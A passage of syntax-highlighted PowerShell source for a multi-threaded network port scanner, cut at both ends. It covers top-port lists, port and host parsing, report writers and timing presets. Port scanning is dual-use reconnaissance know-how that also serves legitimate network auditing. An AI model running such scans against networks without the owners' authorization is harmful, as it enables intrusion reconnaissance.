class="hljs-number">524</span>,<span class="hljs-number">668</span>,<span class="hljs-number">765</span>,<span class="hljs-number">2041</span>,<span class="hljs-number">5999</span>,<span class="hljs-number">10082</span>,<span class="hljs-number">259</span>,<span class="hljs-number">1007</span>,<span class="hljs-number">1417</span>,<span class="hljs-number">1434</span>,<span class="hljs-number">1984</span>,<span class="hljs-number">2038</span>,<span class="hljs-number">2068</span>,<span class="hljs-number">4343</span>,<br>                        <span class="hljs-number">6009</span>,<span class="hljs-number">7004</span>,<span class="hljs-number">44443</span>,<span class="hljs-number">109</span>,<span class="hljs-number">687</span>,<span class="hljs-number">726</span>,<span class="hljs-number">911</span>,<span class="hljs-number">1461</span>,<span class="hljs-number">2035</span>,<span class="hljs-number">4125</span>,<span class="hljs-number">6006</span>,<span class="hljs-number">7201</span>,<span class="hljs-number">9103</span>,<span class="hljs-number">125</span>,<span class="hljs-number">481</span>,<span class="hljs-number">683</span>,<span class="hljs-number">903</span>,<br>                        <span class="hljs-number">1011</span>,<span class="hljs-number">1455</span>,<span class="hljs-number">2013</span>,<span class="hljs-number">2043</span>,<span class="hljs-number">2047</span>,<span class="hljs-number">6668</span>,<span class="hljs-number">6669</span>,<span class="hljs-number">256</span>,<span class="hljs-number">406</span>,<span class="hljs-number">843</span>,<span class="hljs-number">2042</span>,<span class="hljs-number">2045</span>,<span class="hljs-number">5998</span>,<span class="hljs-number">9929</span>,<span class="hljs-number">31337</span>,<span class="hljs-number">44442</span>,<br>                        <span class="hljs-number">1092</span>,<span class="hljs-number">1095</span>,<span class="hljs-number">1102</span>,<span class="hljs-number">1105</span>,<span class="hljs-number">1113</span>,<span class="hljs-number">1121</span>,<span class="hljs-number">1123</span>,<span class="hljs-number">1126</span>,<span class="hljs-number">1130</span>,<span class="hljs-number">1132</span>,<span class="hljs-number">1137</span>,<span class="hljs-number">1141</span>,<span class="hljs-number">1145</span>,<span class="hljs-number">1147</span>,<span class="hljs-number">1149</span>,<span class="hljs-number">1154</span>,<br>                        <span class="hljs-number">1164</span>,<span class="hljs-number">1165</span>,<span class="hljs-number">1166</span>,<span class="hljs-number">1174</span>,<span class="hljs-number">1185</span>,<span class="hljs-number">1187</span>,<span class="hljs-number">1192</span>,<span class="hljs-number">1198</span>,<span class="hljs-number">1213</span>,<span class="hljs-number">1216</span>,<span class="hljs-number">1217</span>,<span class="hljs-number">1233</span>,<span class="hljs-number">1236</span>,<span class="hljs-number">1244</span>,<span class="hljs-number">1259</span>,<span class="hljs-number">1277</span>,<br>                        <span class="hljs-number">1287</span>,<span class="hljs-number">1300</span>,<span class="hljs-number">1301</span>,<span class="hljs-number">1309</span>,<span class="hljs-number">1322</span>,<span class="hljs-number">1328</span>,<span class="hljs-number">1556</span>,<span class="hljs-number">1641</span>,<span class="hljs-number">1688</span>,<span class="hljs-number">1719</span>,<span class="hljs-number">1721</span>,<span class="hljs-number">1805</span>,<span class="hljs-number">1812</span>,<span class="hljs-number">1839</span>,<span class="hljs-number">1875</span>,<span class="hljs-number">1914</span>,<br>                        <span class="hljs-number">1971</span>,<span class="hljs-number">1972</span>,<span class="hljs-number">1974</span>,<span class="hljs-number">2099</span>,<span class="hljs-number">2170</span>,<span class="hljs-number">2196</span>,<span class="hljs-number">2200</span>,<span class="hljs-number">2288</span>,<span class="hljs-number">2366</span>,<span class="hljs-number">2382</span>,<span class="hljs-number">2557</span>,<span class="hljs-number">2800</span>,<span class="hljs-number">2910</span>,<span class="hljs-number">2920</span>,<span class="hljs-number">2968</span>,<span class="hljs-number">3007</span>,<br>                        <span class="hljs-number">3013</span>,<span class="hljs-number">3050</span>,<span class="hljs-number">3119</span>,<span class="hljs-number">3304</span>,<span class="hljs-number">3307</span>,<span class="hljs-number">3376</span>,<span class="hljs-number">3400</span>,<span class="hljs-number">3410</span>,<span class="hljs-number">3514</span>,<span class="hljs-number">3684</span>,<span class="hljs-number">3697</span>,<span class="hljs-number">3700</span>,<span class="hljs-number">3824</span>,<span class="hljs-number">3846</span>,<span class="hljs-number">3848</span>,<span class="hljs-number">3859</span>,<br>                        <span class="hljs-number">3863</span>,<span class="hljs-number">3870</span>,<span class="hljs-number">3872</span>,<span class="hljs-number">3888</span>,<span class="hljs-number">3907</span>,<span class="hljs-number">3916</span>,<span class="hljs-number">3931</span>,<span class="hljs-number">3941</span>,<span class="hljs-number">3957</span>,<span class="hljs-number">3963</span>,<span class="hljs-number">3968</span>,<span class="hljs-number">3969</span>,<span class="hljs-number">3972</span>,<span class="hljs-number">3990</span>,<span class="hljs-number">3993</span>,<span class="hljs-number">3994</span>,<br>                        <span class="hljs-number">4009</span>,<span class="hljs-number">4040</span>,<span class="hljs-number">4080</span>,<span class="hljs-number">4096</span>,<span class="hljs-number">4143</span>,<span class="hljs-number">4147</span>,<span class="hljs-number">4200</span>,<span class="hljs-number">4252</span>,<span class="hljs-number">4430</span>,<span class="hljs-number">4555</span>,<span class="hljs-number">4600</span>,<span class="hljs-number">4658</span>,<span class="hljs-number">4875</span>,<span class="hljs-number">4949</span>,<span class="hljs-number">5040</span>,<span class="hljs-number">5063</span>,<br>                        <span class="hljs-number">5074</span>,<span class="hljs-number">5151</span>,<span class="hljs-number">5212</span>,<span class="hljs-number">5223</span>,<span class="hljs-number">5242</span>,<span class="hljs-number">5279</span>,<span class="hljs-number">5339</span>,<span class="hljs-number">5353</span>,<span class="hljs-number">5501</span>,<span class="hljs-number">5807</span>,<span class="hljs-number">5812</span>,<span class="hljs-number">5818</span>,<span class="hljs-number">5823</span>,<span class="hljs-number">5868</span>,<span class="hljs-number">5869</span>,<span class="hljs-number">5899</span>,<br>                        <span class="hljs-number">5905</span>,<span class="hljs-number">5909</span>,<span class="hljs-number">5914</span>,<span class="hljs-number">5918</span>,<span class="hljs-number">5938</span>,<span class="hljs-number">5940</span>,<span class="hljs-number">5968</span>,<span class="hljs-number">5981</span>,<span class="hljs-number">6051</span>,<span class="hljs-number">6060</span>,<span class="hljs-number">6068</span>,<span class="hljs-number">6203</span>,<span class="hljs-number">6247</span>,<span class="hljs-number">6500</span>,<span class="hljs-number">6504</span>,<span class="hljs-number">6520</span>,<br>                        <span class="hljs-number">6550</span>,<span class="hljs-number">6600</span>)<br>            <span class="hljs-variable">$numPorts</span>--<br>            <span class="hljs-variable">$portList</span>.AddRange(<span class="hljs-variable">$topPortList</span>[<span class="hljs-number">0</span><span class="hljs-type">..</span><span class="hljs-variable">$numPorts</span>])<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-Ports</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$Ports</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$pList</span><br>            )<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$pRange</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Ports</span>.Split(<span class="hljs-string">&quot;,&quot;</span>))<br>            &#123;<br><br>                <span class="hljs-comment">#-1 is a special case for ping</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pRange</span> <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;-1&quot;</span>)<br>                &#123;<br>                    <span class="hljs-variable">$pList</span>.Add([<span class="hljs-built_in">int</span>]<span class="hljs-variable">$pRange</span>)<br>                &#125;<br>                <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$pRange</span>.Contains(<span class="hljs-string">&quot;-&quot;</span>))<br>                &#123;<br>                    [<span class="hljs-built_in">int</span>[]] <span class="hljs-variable">$range</span> = <span class="hljs-variable">$pRange</span>.Split(<span class="hljs-string">&quot;-&quot;</span>)<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$range</span>.Count <span class="hljs-operator">-ne</span> <span class="hljs-number">2</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$pRange</span>.Split(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">0</span>] <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$pRange</span>.split(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">1</span>] <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;&quot;</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Invalid port range&quot;</span><br>                    &#125;<br><br>                    <span class="hljs-variable">$pList</span>.AddRange(<span class="hljs-variable">$range</span>[<span class="hljs-number">0</span>]..<span class="hljs-variable">$range</span>[<span class="hljs-number">1</span>])<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-variable">$pList</span>.Add([<span class="hljs-built_in">int</span>]<span class="hljs-variable">$pRange</span>)<br>                &#125;<br><br>            &#125;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$pList</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span> <span class="hljs-operator">-lt</span> <span class="hljs-literal">-1</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$p</span> <span class="hljs-operator">-gt</span> <span class="hljs-number">65535</span>)<br>                &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Port <span class="hljs-variable">$p</span> out of range&quot;</span><br>                &#125;<br>            &#125;<br>         &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-IpPorts</span></span><br>        &#123;<br>           <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$PortFile</span><br>            )<br><br>            <span class="hljs-built_in">Get-Content</span> <span class="hljs-variable">$PortFile</span> | <span class="hljs-built_in">ForEach-Object</span> &#123;<br>                Parse<span class="hljs-literal">-Ports</span> <span class="hljs-literal">-Ports</span> <span class="hljs-variable">$_</span> <span class="hljs-literal">-pList</span> <span class="hljs-variable">$portList</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Remove-Ports</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$ExcludedPorts</span><br>            )<br><br>            [<span class="hljs-built_in">int</span>[]] <span class="hljs-variable">$ExcludedPorts</span> = <span class="hljs-variable">$ExcludedPorts</span>.Split(<span class="hljs-string">&quot;,&quot;</span>)<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$x</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$ExcludedPorts</span>)<br>            &#123;<br>                <span class="hljs-variable">$portList</span>.Remove(<span class="hljs-variable">$x</span>)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Write-PortscanOut</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;Comment&quot;</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$comment</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$outhost</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$isUp</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] <span class="hljs-variable">$openPorts</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] <span class="hljs-variable">$closedPorts</span>,<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>, <span class="hljs-type">ParameterSetName</span>=<span class="hljs-string">&quot;HostOut&quot;</span>)] <span class="hljs-variable">$filteredPorts</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$SkipDiscovery</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$grepStream</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-type">System.Xml.XmlWriter</span>] <span class="hljs-variable">$xmlStream</span>,<br>                [<span class="hljs-type">Parameter</span>()] [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$readableStream</span><br><br>            )<br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$PSCmdlet</span>.ParameterSetName)<br>            &#123;<br>                <span class="hljs-string">&quot;Comment&quot;</span><br>                &#123;<br><br>                    <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-variable">$comment</span><br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$grepStream</span>) &#123;<br>                        <span class="hljs-variable">$grepStream</span>.WriteLine(<span class="hljs-string">&quot;# &quot;</span> + <span class="hljs-variable">$comment</span>)<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                        <span class="hljs-variable">$xmlStream</span>.WriteComment(<span class="hljs-variable">$comment</span>)<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$readableStream</span>) &#123;<br>                        <span class="hljs-variable">$readableStream</span>.WriteLine(<span class="hljs-variable">$comment</span>)<br>                    &#125;<br>                &#125;<br>                <span class="hljs-string">&quot;HostOut&quot;</span><br>                &#123;<br>                    <span class="hljs-variable">$oPort</span> = [<span class="hljs-built_in">string</span>]::join(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$openPorts</span>.ToArray())<br>                    <span class="hljs-variable">$cPort</span> = [<span class="hljs-built_in">string</span>]::join(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$closedPorts</span>.ToArray())<br>                    <span class="hljs-variable">$fPort</span> = [<span class="hljs-built_in">string</span>]::join(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$filteredPorts</span>.ToArray())<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$grepStream</span>) &#123;<br>                       <span class="hljs-comment">#for grepstream use tabs - can be ugly, but easier for regex</span><br>                       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span> <span class="hljs-operator">-and</span> !<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tStatus: Up&quot;</span>)<br>                        &#125;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$oPort</span> <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                                <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tOpen Ports: <span class="hljs-variable">$oPort</span>&quot;</span>)<br>                            &#125;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cPort</span> <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                                <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tClosed Ports: <span class="hljs-variable">$cPort</span>&quot;</span>)<br>                            &#125;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fPort</span> <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                                <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tFiltered Ports: <span class="hljs-variable">$fPort</span>&quot;</span>)<br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">elseif</span> (!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-variable">$grepStream</span>.writeline(<span class="hljs-string">&quot;Host: <span class="hljs-variable">$outhost</span>`tStatus: Down&quot;</span>)<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$xmlStream</span>) &#123;<br>                        <span class="hljs-variable">$xmlStream</span>.WriteStartElement(<span class="hljs-string">&quot;Host&quot;</span>)<br><br>                        <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-variable">$outhost</span>)<br>                        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span>) &#123;<br>                                <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;Status&quot;</span>, <span class="hljs-string">&quot;Up&quot;</span>)<br>                             &#125;<br>                             <span class="hljs-keyword">else</span> &#123;<br>                                <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;Status&quot;</span>, <span class="hljs-string">&quot;Downs&quot;</span>)<br>                             &#125;<br>                        &#125;<br><br>                        <span class="hljs-variable">$xmlStream</span>.WriteStartElement(<span class="hljs-string">&quot;Ports&quot;</span>)<br>                        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$openPorts</span>) &#123;<br>                            <span class="hljs-variable">$xmlStream</span>.writestartElement(<span class="hljs-string">&quot;Port&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$p</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;state&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br><br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$closedPorts</span>) &#123;<br>                            <span class="hljs-variable">$xmlStream</span>.writestartElement(<span class="hljs-string">&quot;Port&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$p</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;state&quot;</span>, <span class="hljs-string">&quot;closed&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$filteredPorts</span>) &#123;<br>                            <span class="hljs-variable">$xmlStream</span>.writestartElement(<span class="hljs-string">&quot;Port&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;id&quot;</span>, [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$p</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;state&quot;</span>, <span class="hljs-string">&quot;filtered&quot;</span>)<br>                            <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                        &#125;<br><br>                        <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                        <span class="hljs-variable">$xmlStream</span>.WriteEndElement()<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$readableStream</span>) &#123;<br>                        <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;Porscan.ps1 scan report for <span class="hljs-variable">$outhost</span>&quot;</span>)<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span>) &#123;<br>                            <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;Host is up&quot;</span>)<br>                        &#125;<br><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$isUp</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$SkipDiscovery</span>) &#123;<br><br>                            <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-string">&quot;PORT&quot;</span>, <span class="hljs-string">&quot;STATE&quot;</span>))<br><br>                            [<span class="hljs-built_in">int</span>[]]<span class="hljs-variable">$allports</span> = <span class="hljs-variable">$openPorts</span> + <span class="hljs-variable">$closedPorts</span> + <span class="hljs-variable">$filteredPorts</span><br>                            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$p</span> <span class="hljs-keyword">in</span> (<span class="hljs-variable">$allports</span>| <span class="hljs-built_in">Sort-Object</span>))<br>                            &#123;<br>                                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$openPorts</span>.Contains(<span class="hljs-variable">$p</span>)) &#123;<br>                                    <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$p</span>, <span class="hljs-string">&quot;open&quot;</span>))<br>                                &#125;<br>                                <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$closedPorts</span>.Contains(<span class="hljs-variable">$p</span>)) &#123;<br>                                    <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$p</span>, <span class="hljs-string">&quot;closed&quot;</span>))<br>                                &#125;<br>                                <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$filteredPorts</span>.Contains(<span class="hljs-variable">$p</span>)) &#123;<br>                                    <span class="hljs-variable">$readableStream</span>.writeline((<span class="hljs-string">&quot;&#123;0,-10&#125;&#123;1,0&#125;&quot;</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$p</span>, <span class="hljs-string">&quot;filtered&quot;</span>))<br>                                &#125;<br>                            &#125;<br><br>                        &#125;<br>                        <span class="hljs-keyword">elseif</span>(!<span class="hljs-variable">$SkipDiscovery</span>) &#123;<br>                            <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;Host is Down&quot;</span>)<br>                        &#125;<br>                        <span class="hljs-variable">$readableStream</span>.writeline(<span class="hljs-string">&quot;&quot;</span>)<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">#function for Powershell v2.0 to work</span><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Convert-SwitchtoBool</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$switchValue</span><br>            )<br>            <span class="hljs-keyword">If</span> (<span class="hljs-variable">$switchValue</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$True</span><br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$False</span><br>        &#125;<br><br>        <span class="hljs-keyword">try</span><br>        &#123;<br><br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$SkipDiscovery</span> = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$SkipDiscovery</span>)<br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$PingOnly</span> = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$PingOnly</span>)<br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$quiet</span>  = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$quiet</span>)<br>            [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$ForceOverwrite</span>  = <span class="hljs-built_in">Convert-SwitchtoBool</span> (<span class="hljs-variable">$ForceOverwrite</span>)<br><br>            <span class="hljs-comment">#########</span><br>            <span class="hljs-comment">#parse arguments</span><br>            <span class="hljs-comment">#########</span><br><br>            [<span class="hljs-type">Environment</span>]::CurrentDirectory=(<span class="hljs-built_in">Get-Location</span> <span class="hljs-literal">-PSProvider</span> FileSystem).ProviderPath<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$PsCmdlet</span>.ParameterSetName <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;cmdHosts&quot;</span>)<br>            &#123;<br>                <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$h</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Hosts</span>)<br>                &#123;<br>                    Parse<span class="hljs-literal">-Hosts</span>(<span class="hljs-variable">$h</span>) | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                Parse<span class="hljs-literal">-ILHosts</span>(<span class="hljs-variable">$HostFile</span>) | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ExcludeHosts</span>)<br>            &#123;<br>                Exclude<span class="hljs-literal">-Hosts</span>(<span class="hljs-variable">$ExcludeHosts</span>)<br>            &#125;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$TopPorts</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$Ports</span>) <span class="hljs-operator">-or</span> (<span class="hljs-variable">$TopPorts</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$PortFile</span>))<br>            &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Cannot set topPorts with other specific ports&quot;</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Ports</span>)<br>            &#123;<br>                Parse<span class="hljs-literal">-Ports</span> <span class="hljs-literal">-Ports</span> <span class="hljs-variable">$Ports</span> <span class="hljs-literal">-pList</span> <span class="hljs-variable">$portList</span> | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$PortFile</span>)<br>            &#123;<br>                Parse<span class="hljs-literal">-IpPorts</span>(<span class="hljs-variable">$PortFile</span>) | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$portList</span>.Count <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$TopPorts</span>)<br>                &#123;<br>                    <span class="hljs-built_in">Get-TopPort</span>(<span class="hljs-variable">$TopPorts</span>) | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    <span class="hljs-comment">#if the ports still aren&#x27;t set, give the deftault, top 50 ports</span><br>                    <span class="hljs-built_in">Get-TopPort</span>(<span class="hljs-number">50</span>) | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ExcludedPorts</span>)<br>            &#123;<br>                <span class="hljs-built_in">Remove-Ports</span> <span class="hljs-literal">-ExcludedPorts</span> <span class="hljs-variable">$ExcludedPorts</span> | <span class="hljs-built_in">Out-Null</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$T</span>)<br>            &#123;<br>                <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$T</span>)<br>                &#123;<br>                    <span class="hljs-number">5</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">30</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">1000</span>; <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">750</span> &#125;<br>                    <span class="hljs-number">4</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">25</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">1000</span>; <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">1200</span> &#125;<br>                    <span class="hljs-number">3</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">20</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">100</span>;  <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">2500</span> &#125;<br>                    <span class="hljs-number">2</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">15</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">32</span>;   <span class="hljs-variable">$Timeout</span> = 